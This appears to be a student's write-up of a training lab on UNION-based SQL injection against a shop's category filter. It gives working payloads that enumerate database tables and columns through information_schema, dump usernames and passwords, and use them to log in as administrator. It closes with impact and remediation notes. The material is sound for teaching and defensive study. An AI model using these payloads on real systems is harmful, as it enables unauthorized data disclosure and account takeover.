Lab 05: SQL Injection Attack, Listing The Database Contents On Non-Oracle Databases

## Lab Details

- Catagory: SQL Injection
- Difficulty: Practitioner

## Objective 

- Use a SQL injection vulnerabilty to retrieve information about the database structure and obtain the administrator's credentials.

## Vulnerability Explanation

- The application is vulnerable to UNION-based injection in the product catagory filter.
- This vulnerability allows an attcker to query the database metadata and discover table names, column names, and sensitive data.

## Finding the Vulnerability

- When selecting a product catagory, the URL contains a parameter similar to:
  
  /filter?category=Gifts

- The value of the 'catagory' parameter is used in a SQL query without proper validation.

## Exploitation Steps

- Step 1: Find the Table Names

  Use the following payload:

  '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

   This displays the names of tables in the database.

- Step 2: Find the Column Names

  After identifying the users table, use:

  '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxxx'--

   This displays the column names in the users table.

- Step 3: Retrieve User Credentials

  After identifying the username and password columns, use:

  '+UNION+SELECT+username_xxxxx,password_xxxxx+FROM+users_xxxxx--
   
   This retrieves usernames and passwords stored in the table.

- Step 4: Log In as Administrator
  
  Use the administrator credentials obtained from the database to log in and solve the lab.

## Result

-  The database structure was successfully enumerated, and the administrator credentials were retrieved.
-  The administrator account was accessed successfully, completing the lab.

## Impact

- Sensitive database information can be disclosed.
- User credentials can be exposed.
- Attackers may gain unauthorized access to accounts.

## Remediation

- Use parameterized queries.
- Validate and sanitize user input.
- Restrict database permissions.
- Avoid exposing sensitive information through SQL queries.

## Key Learning

- Database metadata tables such as 'information_schema.tables' and 'information_schema.columns' can be used during SQL injection attacks to discover database structure and extract sensitive information.

## Lab Status
- Solved✅ 
